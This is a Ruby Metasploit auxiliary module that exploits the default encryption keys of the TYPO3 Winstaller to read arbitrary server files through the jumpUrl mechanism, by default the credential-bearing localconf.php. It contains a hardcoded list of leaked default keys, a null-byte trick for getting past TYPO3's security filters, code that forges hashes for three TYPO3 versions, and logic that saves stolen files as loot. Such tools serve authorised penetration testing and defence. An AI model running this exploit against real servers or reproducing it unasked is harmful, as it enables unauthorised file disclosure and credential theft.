##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'           => 'TYPO3 Winstaller Default Encryption Keys',
			'Description'    => %q{
				This module exploits known default encryption keys found in the TYPO3 Winstaller.
				This flaw allows for file disclosure in the jumpUrl mechanism. This issue can be
				used to read any file that the web server user account has access to view.

				The method used to create the juhash (short MD5 hash) was altered in later versions
				of Typo3. Use the show actions command to display and select the version of TYPO3 in
				use (defaults to the older method of juhash creation).
			},
			'References'     =>
				[
					['URL', 'http://typo3winstaller.sourceforge.net/'],
				],
			'Author'         => [ 'Chris John Riley' ],
			'License'        => MSF_LICENSE,
			'Actions'        =>
				[
					[	'Short_MD5',
						{
							'Description' => 'TYPO3 4.1.13 (or earlier), 4.2.12 (or earlier), 4.3.3 (or earlier), or 4.4.0'
						}
					],
					[	'MIME',
						{
							'Description' => 'TYPO3 4.1.14 (or later), 4.2.13 - 4.2.14, 4.3.4 - 4.3.6, or 4.4.1 - 4.4.3'
						}
					],
					[	'HMAC_SHA1',
						{
							'Description' => 'TYPO3 4.2.15 (or later), 4.3.7 (or later), 4.4.4 (or later), 4.5.0 (or later)'
						}
					]
				],
			'DefaultAction'  => 'Short_MD5'
		)

		register_options(
			[
				Opt::RPORT(8503),
				OptString.new('URI', [true, "TYPO3 Path", "/"]),
				OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
				OptString.new('ENC_KEY', [false, "Encryption key if known", '']),
			], self.class)

	end

	def run

	# Add padding to bypass TYPO3 security filters
	#
	# Null byte fixed in PHP 5.3.4
	#

	case datastore['RFILE']
	when nil
		# Nothing
	when /localconf\.php$/i
		jumpurl = "#{datastore['RFILE']}%00/."
		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
	when /^\.\.(\/|\\)/i
		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
	else
		jumpurl_len = (datastore['RFILE'].length)
		jumpurl = "#{datastore['RFILE']}"
		jumpurl_enc = "#{datastore['RFILE']}"
	end

	case action.name
	when 'Short_MD5'
		print_status("Performing downloading using Short_MD5 style juHash creation - see show actions for more details")
	when 'MIME'
		print_status("Performing downloading using MIME style juHash creation - see show actions for more details")
	when 'HMAC_SHA1'
		print_status("Performing downloading using HMAC_SHA1 style juHash creation - see show actions for more details")
	end

	print_status("Establishing a connection to #{rhost}:#{rport}")
	print_status("Trying to retrieve #{datastore['RFILE']}")

	if datastore['ENC_KEY'] != ''
		encryption_keys = [datastore['ENC_KEY']]
		print_status("Using provided Encryption Key")
	else
		print_status("Rotating through known encryption keys")
		encryption_keys = [
			#TYPO3 4.3.x - 4.4.x
			'd696ab49a803d7816021cb1768a6917d',
			'47d1e990583c9c67424d369f3414728e6793d9dc2ae3429d488a7374bc85d2a0b19b62de67d46a6079a75f10934288d3',
			'7b13b2203029ed80337f27127a9f1d28c2597f4c08c9a07b782b674731ecf5328c4d900851957899acdc6d4f911bf8b7',
			#TYPO3 4.4.7+
			'fbbdebd9091d914b3cd523485afe7b03e6006ade4125e4cf4c46195b3cecbb9ae0fe0f7b5a9e72ea2ac5f17b66f5abc7',
			#TYPO3 4.5.0
			'def76f1d8139304b7edea83b5f40201088ba70b20feabd8b2a647c4e71774b7b0e4086e4039abaf5d4f6a521f922e8a2',
			'bac0112e14971f00431639342415ff22c3c3bf270f94175b8741c0fa95df244afb61e483c2facf63cffc320ed61f2731',
			#TYPO3 4.5.2
			'14b1225e2c277d55f54d18665791f114f4244f381113094e2a19dfb680335d842e10460995eb653d105a562a5415d9c7',
			#TYPO3 4.5.3
			'5d4eede80d5cec8df159fd869ec6d4041cd2fc0136896458735f8081d4df5c22bbb0665ddac56056023e01fbd4ab5283',
			#TYPO3 4.5.4 - 4.5.7
			'b2aae63def4c512ce8f4386e57b8a48b40312de30775535cbff60a6eab356809a0b596edaad49c725d9963d93aa2ffae',
			]
	end

	counter = 0
	encryption_keys.each do |enc_key|

		counter = counter +1
		locationData = Rex::Text::rand_text_numeric(1) +'::'+ Rex::Text::rand_text_numeric(2)

		case action.name
		when 'Short_MD5'
			juarray = "a:3:{i:0;s:#{jumpurl_len.to_s()}:\"#{jumpurl_enc}\""
			juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\""
			juarray << ";i:2;s:#{enc_key.length}:\"#{enc_key}\";}"
			juhash = Digest::MD5.hexdigest(juarray)
			juhash = juhash[0..9] # shortMD5 value for use as juhash
		when 'MIME'
			juarray = "a:4:{i:0;s:#{jumpurl_len.to_s()}:\"#{jumpurl_enc}\""
			juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\";i:2;s:0:\"\""
			juarray << ";i:3;s:#{enc_key.length}:\"#{enc_key}\";}"
			juhash = Digest::MD5.hexdigest(juarray)
			juhash = juhash[0..9] # shortMD5 value for use as juhash
		when 'HMAC_SHA1'
			juarray = "a:3:{i:0;s:#{jumpurl_len.to_s()}:\"#{jumpurl_enc}\""
			juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\";i:2;"
			juarray << "s:0:\"\";}"
			juhash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new('sha1'), enc_key, juarray)
		end

		file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
		file_uri = file_uri.sub("//", "/") # Prevent double // from appearing in uri
		vprint_status("Checking Encryption Key [#{counter}/#{encryption_keys.length}]: #{enc_key}")

		begin
			file = send_request_raw({
			'uri'       => file_uri,
			'method'    => 'GET',
			'headers'   =>
				{
					'Connection' => 'Close',
				}
			},25)

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
			print_error(e.message)
			return
		rescue ::Timeout::Error, ::Errno::EPIPE => e
			print_error(e.message)
			return
		end

		case file.headers['Content-Type']
		when 'text/html'
			case file.body
			when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
				print_error("File #{datastore['RFILE']} does not exist.")
				print_good("Discovered encryption key : #{enc_key}")
				return
			when 'jumpurl Secure: locationData, ' + locationData + ', was not accessible.'
				print_error("File #{datastore['RFILE']} is not accessible.")
				print_good("Discovered encryption key : #{enc_key}")
				return
			when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
				print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
				print_good("Discovered encryption key : #{enc_key}")
				return
			end
		when 'application/octet-stream'
			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
			print_good("Discovered encryption key : #{enc_key}")
			print_good("Writing local file " + File.basename(datastore['RFILE'].downcase) + " to loot")
			store_loot("typo3_" + File.basename(datastore['RFILE'].downcase), "text/xml", addr, file.body, "typo3_" + File.basename(datastore['RFILE'].downcase), "Typo3_winstaller")
			return
		else
			if datastore['ENC_KEY'] != ""
				print_error("Encryption Key specified is not correct")
				return
			end
		end
	end

	print_error("#{rhost}:#{rport} [Typo3] Failed to retrieve file #{datastore['RFILE']}")
	print_error("Maybe try checking the ACTIONS - Currently using  #{action.name}")

	end

end
